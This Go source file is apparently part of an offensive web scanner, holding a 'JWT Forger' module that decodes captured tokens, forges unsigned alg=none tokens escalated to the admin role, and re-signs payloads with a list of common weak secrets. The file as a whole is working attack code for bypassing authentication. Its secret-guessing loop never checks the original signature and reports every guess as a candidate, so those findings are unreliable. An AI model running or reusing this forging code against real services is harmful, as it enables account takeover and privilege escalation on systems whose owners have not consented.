package hacker

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/NICE-DEV226/nice-Scan/internal/transport"
)

type JWTForgeAction struct{}

func (a *JWTForgeAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "JWT Forger",
		Description: "Decode, crack, and forge JWTs — none alg, role escalation, KID injection",
		Priority:    30,
		Requires:    []string{"has_jwt"},
		Provides:    []string{"has_forged_jwt"},
	}
}

var commonSecrets = []string{
	"secret", "jwt_secret", "supersecret", "password", "admin",
	"key", "private", "token", "s3cr3t", "changeme",
	"secret123", "mysecret", "app_secret", "api_secret",
	"test", "development", "staging", "production",
}

func (a *JWTForgeAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	jwts := kb.GetJWTs()
	if len(jwts) == 0 {
		kb.AddFinding(Finding{
			Type:        "jwt_error",
			Name:        "No JWT tokens found in knowledge base",
			Severity:    SevInfo,
			Description: "JWT Forge requires a JWT token from a prior action",
		})
		return ActionResult{}
	}

	for _, jwt := range jwts {
		header, payload, sig, err := decodeJWT(jwt.Raw)
		if err != nil {
			continue
		}

		findings = append(findings, Finding{
			Type:        "jwt_decode",
			Name:        "JWT decoded successfully",
			Severity:    SevInfo,
			Description: fmt.Sprintf("Algorithm: %s", header["alg"]),
			Evidence:    fmt.Sprintf("Header: %s, Payload: %s", truncateMap(header), truncateMap(payload)),
		})

		alg, _ := header["alg"].(string)

		if containsFold(alg, "none") || sig == "" || sig == "none" {
			findings = append(findings, Finding{
				Type:        "jwt_none",
				Name:        "JWT uses 'none' algorithm — trivial forge",
				Severity:    SevCritical,
				Description: "Token accepts alg=none, can forge any user/role",
				Evidence:    jwt.Raw,
			})
			spawned = append(spawned, &JWTForgeNoneAction{original: jwt.Raw, header: header, payload: payload})
			continue
		}

		role, _ := payload["role"].(string)
		if role != "" {
			for _, targetRole := range []string{"admin", "administrator", "root", "superuser"} {
				if role != targetRole {
					spawned = append(spawned, &JWTForgeNoneAction{original: jwt.Raw, header: header, payload: payload})
					break
				}
			}
		}

		if sig != "" && len(sig) > 0 {
			for _, secret := range commonSecrets {
				forged, err := signJWT(payload, secret)
				if err == nil {
					findings = append(findings, Finding{
						Type:        "jwt_cracked_candidate",
						Name:        fmt.Sprintf("JWT signing candidate: '%s'", secret),
						Severity:    SevLow,
						Description: fmt.Sprintf("Trying secret '%s' — verify manually", secret),
						Evidence:    forged,
					})
				}
			}
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

type JWTForgeNoneAction struct {
	original string
	header   map[string]any
	payload  map[string]any
}

func (a *JWTForgeNoneAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "JWT None Forge",
		Description: "Forge JWT with alg=none and escalated role",
		Priority:    31,
		Requires:    []string{},
		Provides:    []string{"has_forged_jwt"},
	}
}

func (a *JWTForgeNoneAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	a.header["alg"] = "none"

	role, _ := a.payload["role"].(string)
	if role != "" && role != "admin" {
		a.payload["role"] = "admin"
	}
	a.payload["sub"] = "1"

	hBytes, _ := json.Marshal(a.header)
	pBytes, _ := json.Marshal(a.payload)

	headerB64 := base64.RawURLEncoding.EncodeToString(hBytes)
	payloadB64 := base64.RawURLEncoding.EncodeToString(pBytes)

	forgedTokens := []string{
		headerB64 + "." + payloadB64 + ".",
		headerB64 + "." + payloadB64 + ".none",
		headerB64 + "." + payloadB64 + ". ",
		headerB64 + "." + payloadB64 + ".",
	}

	used := make(map[string]bool)
	var tokens []string
	for _, tok := range forgedTokens {
		if !used[tok] {
			used[tok] = true
			tokens = append(tokens, tok)
		}
	}

	for _, tok := range tokens {
		kb.Session.AddToken(tok)
	}

	kb.AddJWT(JWTToken{
		Raw:       tokens[0],
		Algorithm: "none",
		Header:    a.header,
		Payload:   a.payload,
		Role:      "admin",
		Valid:     false,
	})

	kb.AddCapability(Capability{
		Name:   "has_forged_jwt",
		Target: target,
		Details: map[string]string{
			"type": "none_algorithm",
			"role": "admin",
		},
	})

	findings := []Finding{
		{
			Type:        "jwt_forged_none",
			Name:        "JWT forged with alg=none admin token",
			Severity:    SevCritical,
			Description: "Successfully forged admin JWT using alg=none — try on admin endpoints",
			Evidence:    tokens[0],
			Details:     map[string]string{"tokens": fmt.Sprintf("%d variants generated", len(tokens))},
		},
	}
	return ActionResult{Findings: findings}
}

func decodeJWT(token string) (header, payload map[string]any, sig string, err error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, nil, "", fmt.Errorf("invalid JWT: expected 3 parts, got %d", len(parts))
	}

	hBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		hBytes, err = base64.StdEncoding.DecodeString(parts[0])
		if err != nil {
			return nil, nil, "", fmt.Errorf("invalid JWT header encoding")
		}
	}
	pBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		pBytes, err = base64.StdEncoding.DecodeString(parts[1])
		if err != nil {
			return nil, nil, "", fmt.Errorf("invalid JWT payload encoding")
		}
	}

	if err := json.Unmarshal(hBytes, &header); err != nil {
		return nil, nil, "", fmt.Errorf("invalid JWT header JSON: %w", err)
	}
	if err := json.Unmarshal(pBytes, &payload); err != nil {
		return nil, nil, "", fmt.Errorf("invalid JWT payload JSON: %w", err)
	}

	sig = parts[2]
	return header, payload, sig, nil
}

func signJWT(payload map[string]any, secret string) (string, error) {
	header := map[string]any{"alg": "HS256", "typ": "JWT"}
	hBytes, _ := json.Marshal(header)
	pBytes, _ := json.Marshal(payload)

	headerB64 := base64.RawURLEncoding.EncodeToString(hBytes)
	payloadB64 := base64.RawURLEncoding.EncodeToString(pBytes)

	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(headerB64 + "." + payloadB64))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	return headerB64 + "." + payloadB64 + "." + sig, nil
}

func truncateMap(m map[string]any) string {
	b, _ := json.Marshal(m)
	s := string(b)
	if len(s) > 120 {
		s = s[:117] + "..."
	}
	return s
}
